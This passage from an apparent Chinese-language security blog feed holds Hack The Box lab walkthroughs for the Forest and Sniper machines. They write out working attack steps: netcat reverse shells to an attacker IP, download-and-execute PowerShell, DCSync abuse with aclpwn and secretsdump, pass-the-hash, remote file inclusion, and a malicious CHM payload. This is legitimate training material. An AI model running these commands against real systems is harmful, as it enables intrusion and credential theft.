flag</code>:</strong></p><p><img src="https://p4.ssl.qhimg.com/t01062c6915af4c6690.png"></p><p>为了操作方便后续操作，我决定建立反向shell。把<code>nc64.exe</code>放入<code>/var/html/www</code>目录，开启Apache 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ sudo service apache2 start  </span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t01b3d6b2f9eecdd52d.png"></p><p>在winrm-shell中，下载执行，成功获取反向shell：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> &gt; <span class="built_in">iwr</span> <span class="literal">-uri</span> http://<span class="number">10.10</span>.<span class="number">14.67</span>/nc64.exe <span class="literal">-outf</span> shell.exe</span><br><span class="line"><span class="built_in">PS</span> &gt; ./shell.exe <span class="number">10.10</span>.<span class="number">14.67</span> <span class="number">8888</span> <span class="literal">-e</span> powershell.exe</span><br></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t01983c216d5089e503.png"></p><p><img src="https://p4.ssl.qhimg.com/t013fbea0b507b7a77e.png"></p><h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><blockquote><p>这里使用到了<a href="https://github.com/BloodHoundAD/BloodHound/">Bloodhound</a>工具，如果有小伙伴对<code>active directly attack</code>不了解，可以参见它的github主页：<a href="https://github.com/BloodHoundAD/BloodHound/">https://github.com/BloodHoundAD/BloodHound/</a> 和知乎文章：<a href="https://zhuanlan.zhihu.com/p/121552304">《使用BloodHound查找Active Directory攻击路径》</a>。BloodHound是基于图的权限探索工具，它将列出给定域中对象之间的权限和关系，可以识别Active Directory（AD）中的不同攻击路径，其中包括访问控制列表（ACL）、用户、组、信任关系和唯一的AD对象等。</p><p>kali可以直接运行命令安装：<code>sudo apt-get install bloodhound</code>。</p></blockquote><p>首先将项目git到本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ git clone https://github.com/BloodHoundAD/BloodHound.git</span><br></pre></td></tr></table></figure><p>这里要使用<code>/BloodHoundAD/BloodHound/blob/master/Ingestors/</code>目录下的<code>SharpHound.ps1</code>工具。将它放入<code>/var/html/www</code>中，在<code>svc-alfresco</code>的shell中加载执行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\evil&gt; <span class="built_in">iex</span>(<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&quot;http://10.10.14.67/SharpHound.ps1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\evil&gt; <span class="built_in">invoke-bloodhound</span> <span class="literal">-collectionmethod</span> all <span class="literal">-domain</span> htb.local <span class="literal">-ldapuser</span> svc<span class="literal">-alfresco</span> <span class="literal">-ldappass</span> s3rvice</span><br><span class="line"></span><br><span class="line">-----------------------------------------------</span><br><span class="line">Initializing SharpHound at <span class="number">12</span>:<span class="number">38</span> AM on <span class="number">4</span>/<span class="number">2</span>/<span class="number">2020</span></span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line">Resolved Collection Methods: <span class="built_in">Group</span>, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container</span><br><span class="line"></span><br><span class="line">[+] Creating Schema map <span class="keyword">for</span> domain HTB.LOCAL <span class="keyword">using</span> path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL</span><br><span class="line"><span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\evil&gt; [+] Cache File not Found: <span class="number">0</span> Objects <span class="keyword">in</span> cache</span><br><span class="line"></span><br><span class="line">[+] Pre<span class="literal">-populating</span> Domain Controller SIDS</span><br><span class="line">Status: <span class="number">0</span> objects finished (+<span class="number">0</span>) -- <span class="keyword">Using</span> 84 MB RAM</span><br><span class="line">Status: <span class="number">123</span> objects finished (+<span class="number">123</span> <span class="number">24.6</span>)/s -- <span class="keyword">Using</span> 118 MB RAM</span><br><span class="line">Enumeration finished <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">05.8247737</span></span><br><span class="line">Compressing <span class="keyword">data</span> to C:\Users\svc<span class="literal">-alfresco</span>\evil\<span class="number">20200402003811</span>_BloodHound.zip</span><br><span class="line">You can upload this file directly to the UI</span><br><span class="line"></span><br><span class="line">SharpHound Enumeration Completed at <span class="number">12</span>:<span class="number">38</span> AM on <span class="number">4</span>/<span class="number">2</span>/<span class="number">2020</span>! Happy Graphing!</span><br></pre></td></tr></table></figure><p>执行结束后，可以看到当前目录生成了<code>20200402003811_BloodHound.zip </code>的分析结果：</p><p><img src="https://p1.ssl.qhimg.com/t01dc23f740f2e59396.png"></p><p>为了将分析结果取回，我在kali上开启了samba服务：</p><p>Sam.conf:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string = Samba Server %v</span><br><span class="line">netbios name = kali</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line">bind interfaces only = yes</span><br><span class="line"></span><br><span class="line"># add to the end</span><br><span class="line">[evil]</span><br><span class="line">   path = /home/forest</span><br><span class="line">   writable = yes</span><br><span class="line">   guest ok = yes</span><br><span class="line">   guest only = yes</span><br><span class="line">   read only = no</span><br><span class="line">   create mode = 0777</span><br><span class="line">   directory mode = 0777</span><br><span class="line">   force user = nobody</span><br></pre></td></tr></table></figure><p><img src="https://p4.ssl.qhimg.com/t0101e6e2a4319963a7.png"></p><blockquote><p>这里遇到一个小坑，如果靶机无法复制文件到共享目录（提示权限问题），可以直接将kali上这一共享的文件夹权限设为777，就可以成功传文件了。我猜测虽然在配置smb.conf时设置了<code>write</code>权限，配置了777，出现这个问题可能是配置与建立文件夹的先后顺序的问题。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\evil&gt; <span class="built_in">copy</span> <span class="number">20200402003811</span>_BloodHound.zip \\<span class="number">10.10</span>.<span class="number">14.67</span>\evil</span><br></pre></td></tr></table></figure><p>成功取回分析文件：</p><p><img src="https://p0.ssl.qhimg.com/t014128cf0bf6cef0ac.png"></p><p>在kali上启动BloodHound：</p><p><img src="https://p5.ssl.qhimg.com/t01507083738ba654c7.png"></p><p><img src="https://p3.ssl.qhimg.com/t01c0103d4cb9d0eb83.png"></p><p>导入分析文件<code>20200402003811_BloodHound.zip</code>，在搜索栏中搜索``svc-alfresco@htb.local<code>，添加</code>target：<a href="mailto:&#x41;&#100;&#x6d;&#105;&#x6e;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#x72;&#x40;&#104;&#116;&#x62;&#x2e;&#108;&#111;&#99;&#97;&#108;">&#x41;&#100;&#x6d;&#105;&#x6e;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#x72;&#x40;&#104;&#116;&#x62;&#x2e;&#108;&#111;&#99;&#97;&#108;</a>`，可以看到分析路径图：</p><p><img src="https://p5.ssl.qhimg.com/t014efdf9a589c83934.png"></p><p>从图中可以发现，用户<code>svc-alfresco</code>是<code>SERVICE ACCOUNT@HTB.LOCAL</code>组的成员，该组是另一个组<code>PRIVILEGED ACCOUNT@HTB.LOCAL</code>的成员，进而又是<code>ACCOUNT OPREATION@HTB.LOCAL</code>组的成员，进而又是<code>EXCHANGE WINDOWS PERMISSIONS@HTB.LOACL</code>组的成员，最终连接到域<code>HTB.LOCAL</code>，并且还拥有<code>WriteDACL</code>权限。这一系列关键信息告诉我，可以为用户<code>svc-alfresco</code>授予<code>DCSync</code>特权，并展开<code>DCSync攻击</code>。</p><p>这里使用了<code>aclpwn.py</code>工具进行自动化的利用，对该工具不了解的小伙伴可以参见它的手册：<a href="https://github.com/fox-it/aclpwn.py/wiki/Quickstart">https://github.com/fox-it/aclpwn.py/wiki/Quickstart</a> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ ./aclpwn.py --from svc-alfresco@htb.local --domain htb.local --server 10.10.10.161 --user svc-alfresco --source-password &#x27;s3rvice&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://p2.ssl.qhimg.com/t012b0f00897f4a809c.png"></p><p>接着<code>secretsdump.py</code>获取域中所有的用户hash，成功收获<code>Administrator</code>的hash值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ ./secretsdump.py -just-dc-ntlm &#x27;svc-alfresco:s3rvice@10.10.10.161&#x27;   </span><br></pre></td></tr></table></figure><p><img src="https://p2.ssl.qhimg.com/t0104fe28891db822c0.png"></p><p>利用Impacket工具中<code>wmiexec.py</code>脚本，使用该hash登录Administrator用户，成功获得超级权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ python ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161</span><br></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t01b74cf7cf4d6a0dfd.png"></p><p>进入超级用户桌面，成功拿到<code>root flag</code>:</p><p><img src="https://p4.ssl.qhimg.com/t0117e15cb637b6e633.png"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>域渗透还需要进一步学习和提高，这次针对Forest靶机的渗透，弥补了很多知识空白，过程并不像文章整理的那样流畅，是一个自认为挺艰难的的过程。</p><p>最后，对Forest靶机的渗透测试过程进行一个简单的总结：</p><ul><li><p><strong>信息收集：</strong>查看端口、服务状态，获取到域内关键信息</p></li><li><p><strong>AS-REP Roast攻击 + hash 爆破：</strong>获取低级用户的密码，拿到user flag</p></li><li><p><strong>利用BloodHound展开域渗透分析</strong></p></li><li><p><strong>利用ACLPWN工具展开DCSync攻击：</strong>提权，获得超级用户的hash，拿到root flag</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hack the box: Sniper</title>
    <link href="/2020/09/22/Hack-the-box-Sniper/"/>
    <url>/2020/09/22/Hack-the-box-Sniper/</url>
    
    <content type="html"><![CDATA[<p><img src="https://p3.ssl.qhimg.com/t014580c5bb32d4ece8.png"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><strong>- 关于Hack the box：</strong><a href="https://www.hackthebox.eu/">Hack The Box</a>是一个全球知名的渗透测试靶机平台，在这个平台上，靶机区分为两种状态<code>active</code>、<code>retired</code>。对于<code>retired</code>状态的靶机，需要成为付费vip才能访问（£100/年或者£10/月）。</p><p><strong>- 关于Sniper lab：</strong>我在寻找测试靶机的过程中，发现Sniper在处于<code>retired</code>状态下依然可以访问，白嫖的感觉真香 =）。下图是对Sniper的简要介绍：</p><p><img src="https://p1.ssl.qhimg.com/t0144b24717475e936d.png"></p><p><img src="https://p0.ssl.qhimg.com/t012807f73730007771.png"></p><p><strong>- 渗透测试工具：</strong>kali、masscan、nmap、gobuster、samba、powershell、netcat</p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><p>连接hack the box 个人账户VPN，分配ip：10.10.14.67。</p><p>使用<code>masscan</code>对靶机Sniper的ip：10.10.10.151 进行扫描，发现开放端口80、135、139、445、49667：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~ masscan -e tun0 -p1-65535,U:1-65535 10.10.10.151 --rate=1000</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t019cda3c6a4d431ddf.png"></p><p>使用<code>nmap</code>收集对应端口的服务信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~ nmap -n -v -Pn -p80,135,139,445,49667 -A --reason -oN nmap.txt 10.10.10.151</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t01ff516230b63cfd5c.png"></p><p>经过分析决定从http服务入手进行渗透。访问10.10.10.151，查看到主页：</p><p><img src="https://p5.ssl.qhimg.com/t01265bcba4e3ac0566.png"></p><p>使用<code>gobuster</code>进行文件/目录枚举：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">~ ./gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -t 20 -x php,html -u http://10.10.10.151/</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.151/</span><br><span class="line">[+] Threads:        20</span><br><span class="line">[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/03/31 20:30:29 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/Blog (Status: 301)</span><br><span class="line">/Images (Status: 301)</span><br><span class="line">/Index.php (Status: 200)</span><br><span class="line">/blog (Status: 301)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/images (Status: 301)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/js (Status: 301)</span><br><span class="line">/user (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2020/03/31 21:19:35 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>通过枚举，发现/blog、/user等有用的信息：</p><p><img src="https://p0.ssl.qhimg.com/t01384d344c9d495d50.png"></p><p><img src="https://p1.ssl.qhimg.com/t01b53ae09d26b3fbee.png"></p><h2 id="0x03-文件包含漏洞"><a href="#0x03-文件包含漏洞" class="headerlink" title="0x03 文件包含漏洞"></a>0x03 文件包含漏洞</h2><p><strong>- 本地文件包含（Local File Inclusion）</strong></p><p>在检查blog页面时，发现<code>/blog?lang=***.php</code>，这种形式的GET请求，在参数处尝试文件包含漏洞是一个不错的选择：</p><p><img src="https://p0.ssl.qhimg.com/t014ab237e08c01167c.png"></p><p><img src="https://p1.ssl.qhimg.com/t01b32f21c83e2300ab.png"></p><p>尝试访问绝对路径下的<code>win.ini</code>信息：<code>http://10.10.10.151/blog?lang=/windows/win.ini</code>，成功读取到信息：</p><p><img src="https://p5.ssl.qhimg.com/t013fb5a5fe6b8ea582.png"></p><p><strong>- 远程文件包含漏洞（Remote File Inclusion）</strong></p><p>由本地文件包含漏洞的思路出发，尝试远程文件包含漏洞，这里的思路是使用Samba服务建立公共共享。</p><p>配置<code>smb.conf</code>：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string = Samba Server %v</span><br><span class="line">netbios name = kali</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line">bind interfaces only = yes</span><br><span class="line"></span><br><span class="line"># add to the end</span><br><span class="line">[evil]</span><br><span class="line">   path = /home/sniper</span><br><span class="line">   writable = yes</span><br><span class="line">   guest ok = yes</span><br><span class="line">   guest only = yes</span><br><span class="line">   read only = no</span><br><span class="line">   create mode = 0777</span><br><span class="line">   directory mode = 0777</span><br><span class="line">   force user = nobody</span><br></pre></td></tr></table></figure><p>构造<code>php.info</code>文件，并启动Samba服务，检测远程文件包含漏洞是否存在。经过检测，确实存在，成功读取到信息：</p><p><img src="https://p5.ssl.qhimg.com/t0152ca3cbd748d4cc5.png"></p><p><img src="https://p3.ssl.qhimg.com/t01746962ef968ff3e9.png"></p><h2 id="0x04-获取低级用户的shell"><a href="#0x04-获取低级用户的shell" class="headerlink" title="0x04 获取低级用户的shell"></a>0x04 获取低级用户的shell</h2><p>构造<code>cmd.php</code>、<code>evil.sh</code>，实现命令执行，并查看到当前用户名<code>iusr</code>：</p><p><img src="https://p4.ssl.qhimg.com/t014804465010e5f8b1.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ ./evil.sh whoami    </span><br><span class="line">nt authority\iusr</span><br></pre></td></tr></table></figure><p>为了获得一个反向shell（reverse shell），需要使用<code>evil.sh</code>上传<code>netcat.exe</code>到靶机中。这里尝试了一些文件目录都没有成功，我猜测应该是<code>iusr</code>的权限问题。最终在<code>C:\windows\system32\spool\drivers\color\</code>目录中成功上传<code>2.exe</code>(netcat)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">~ .&#x2F;evil.sh &#39;powershell &#x2F;c iwr \\10.10.14.67&#x2F;evil&#x2F;nc64.exe -outf \windows\system32\spool\drivers\color\2.exe&#39;    </span><br><span class="line"></span><br><span class="line">~.&#x2F;evil.sh &#39;dir \windows\system32\spool\drivers\color\&#39;                                                          </span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 6A2B-2640</span><br><span class="line"></span><br><span class="line"> Directory of C:\windows\system32\spool\drivers\color</span><br><span class="line"></span><br><span class="line">03&#x2F;31&#x2F;2020  03:21 PM    &lt;DIR&gt;          .</span><br><span class="line">03&#x2F;31&#x2F;2020  03:21 PM    &lt;DIR&gt;          ..</span><br><span class="line">03&#x2F;31&#x2F;2020  03:21 PM            43,696 2.exe</span><br><span class="line">09&#x2F;15&#x2F;2018  12:12 AM             1,058 D50.camp</span><br><span class="line">09&#x2F;15&#x2F;2018  12:12 AM             1,079 D65.camp</span><br><span class="line">09&#x2F;15&#x2F;2018  12:12 AM               797 Graphics.gmmp</span><br><span class="line">09&#x2F;15&#x2F;2018  12:12 AM               838 MediaSim.gmmp</span><br><span class="line">09&#x2F;15&#x2F;2018  12:12 AM               786 Photo.gmmp</span><br><span class="line">09&#x2F;15&#x2F;2018  12:12 AM               822 Proofing.gmmp</span><br><span class="line">09&#x2F;15&#x2F;2018  12:12 AM           218,103 RSWOP.icm</span><br><span class="line">09&#x2F;15&#x2F;2018  12:12 AM             3,144 sRGB Color Space Profile.icm</span><br><span class="line">09&#x2F;15&#x2F;2018  12:12 AM            17,155 wscRGB.cdmp</span><br><span class="line">09&#x2F;15&#x2F;2018  12:12 AM             1,578 wsRGB.cdmp</span><br><span class="line">              11 File(s)        289,056 bytes</span><br><span class="line">               2 Dir(s)  17,876,930,560 bytes free</span><br></pre></td></tr></table></figure><p>kali监听1234端口，并建立反向shell连接，成功获取<code>iusr</code>的shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~ .&#x2F;evil.sh &#39;start \windows\system32\spool\drivers\color\2.exe 10.10.14.67 1234 -e cmd.exe&#39;</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t018dd1a71f5ecc2e04.png"></p><h2 id="0x05-提权——普通用户"><a href="#0x05-提权——普通用户" class="headerlink" title="0x05 提权——普通用户"></a>0x05 提权——普通用户</h2><p>利用<code>iusr</code>用户权限寻找有用的信息，发现靶机还有两个用户<code>Administrator</code>、<code>Chris</code>。在<code>C:\inetpub\wwwroot\user\db.php</code>中找到密码<code>36mEAhz/B8xQ~2VM</code>，我猜测这个应该就是<code>Chris</code>的密码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Enter your Host, username, password, database below.</span></span><br><span class="line"><span class="comment">// I left password empty because i do not set password on localhost.</span></span><br><span class="line">$con = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;dbuser&quot;</span>,<span class="string">&quot;36mEAhz/B8xQ~2VM&quot;</span>,<span class="string">&quot;sniper&quot;</span>);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno())</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Failed to connect to MySQL: &quot;</span> . mysqli_connect_error();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看<code>Chris</code>的相关权限，发现他具有远程执行powershell的权限：</p><p><img src="https://p2.ssl.qhimg.com/t01692336bc9e0c316d.png"></p><p>进入powershell，配置<code>Chirs</code>认证信息：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="variable">$pw</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;36mEAhz/B8xQ~2VM&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line">&gt; <span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&quot;snipe\chris&quot;</span>, <span class="variable">$pw</span>)</span><br><span class="line">&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> SNIPER <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br></pre></td></tr></table></figure><p>kali监听4321段端口，成功获取<code>Chris</code>的反向shell：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Start-Process</span> <span class="literal">-FilePath</span> <span class="string">&quot;\windows\system32\spool\drivers\color\2.exe&quot;</span> <span class="literal">-ArgumentList</span> <span class="string">&quot;10.10.14.67 4321 -e cmd.exe&quot;</span> <span class="literal">-NoNewWindow</span></span><br></pre></td></tr></table></figure><p><img src="https://p4.ssl.qhimg.com/t01eb7a4043722217ff.png"></p><p><strong>- 成功获得普通用户权限，拿到<code>user flag</code>:</strong></p><p><img src="https://p0.ssl.qhimg.com/t01197680466fc12bc6.png"></p><h2 id="0x06-提权——超级用户"><a href="#0x06-提权——超级用户" class="headerlink" title="0x06 提权——超级用户"></a>0x06 提权——超级用户</h2><p>在利用<code>Chris</code>权限寻找有用信息的过程中，在<code>C:\Docs\</code>、<code>C:\Users\Chris\Downloads\</code>目录下发现<code>note.txt</code>、<code>instructions.chm</code>两个有意思的文件：</p><p><img src="https://p1.ssl.qhimg.com/t01d4342a8a1364e108.png"></p><p><img src="https://p1.ssl.qhimg.com/t018036c5c6b19d0135.png"></p><p>从<code>note.txt</code>的留言信息中可以推测，老板对Chris的工作很不满意，需要将某个说明文档放到<code>C:\Docs\</code>目录中。而<code>.chm</code>文件就是通过html文件编译形成的“帮助文档”，所以我推测<code>instructions.chm</code>应该就是老板口中需要放在<code>C:\Docs\</code>目录中的文档。但当我将<code>C:\Users\Chris\Downloads\</code>目录下的<code>instructions.chm</code>复制到<code>C:\Docs\</code>中时，发现一个奇怪的现象，<code>instructions.chm</code>会在短时间内奇怪的消失。</p><p><img src="https://p1.ssl.qhimg.com/t01af1e4ef21c0f672f.png"></p><p>文档消失，或许是超级用户删除？让我感到这可能就是超级用户的漏洞点所在。为了利用这一疑点，首先需要构造一个恶意的<code>.chm</code>文件，包含需要执行的反向shell恶意代码，当超级用户对这个恶意文档有任何操作的时候，就能获取到超级用户的shell。</p><p>我在github上寻找如何构造恶意的<code>.chm</code>文件，在这里找到了可以借用的范本：<a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1</a> 。为了构造<code>.chm</code>恶意文件，还需要下载微软的<a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=21138">HTML HELP Workshop</a>。</p><p>这里我在本地计算机中使用<code>powershell</code>，构造了一个名为<code>doc.chm</code>的恶意文件，<code>Payload &quot;C:\windows\system32\spool\drivers\color\2.exe -e powershell 10.10.14.67 8888&quot;</code>：</p><p><img src="https://p0.ssl.qhimg.com/t01d2b6096bb7125c05.png"></p><p><img src="https://p1.ssl.qhimg.com/t01dd14e4b379cdc223.png"></p><p>随后将<code>doc.chm</code>放入kali的samba共享目录中：</p><p><img src="https://p3.ssl.qhimg.com/t01ccde97607c96c3fd.png"></p><p>kali监听8888端口，用<code>Chris</code>的权限进入<code>C:\Docs\</code>，从Samba共享目录中将<code>doc.chm</code>复制到当前目录，并命名为<code>instructions.chm</code>：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Docs&gt; <span class="built_in">iwr</span> \\<span class="number">10.10</span>.<span class="number">14.67</span>/evil/doc.chm <span class="literal">-outf</span> .\instructions.chm</span><br></pre></td></tr></table></figure><p>等待片刻，成功获取到超级用户的反向shell：</p><p><img src="https://p0.ssl.qhimg.com/t014ab2831a0b14f4cb.png"></p><p><strong>- 成功获得超级用户权限，拿到<code> flag</code>:</strong></p><p><img src="https://p1.ssl.qhimg.com/t01d8daafa316484acd.png"></p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>对Sniper靶机的渗透测试思路进行一个简单的总结：</p><ul><li><strong>- 信息收集：</strong>查看端口、服务状态，获取网站目录</li><li><strong>- 验证<code>LFI</code>和<code>RFI</code>漏洞</strong></li><li><strong>- 通过Samba服务利用<code>RFI</code>漏洞</strong>：获得iuser的shell</li><li><strong>- 搜寻获取<code>Chris</code>的用户凭证</strong></li><li><strong>- 使用<code>Chris</code>角色在powershell中执行命令，获得<code>Chris</code>的shell</strong>：拿到user flag</li><li><strong>- 构造恶意的<code>.chm</code>文件</strong>：包含反向shell的恶意代码</li><li><strong>- 将恶意文件放入指定目录，等待超级用户执行操作，获取超级用户的shell：</strong>拿到root flag</li></ul>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FLAWS challenge</title>
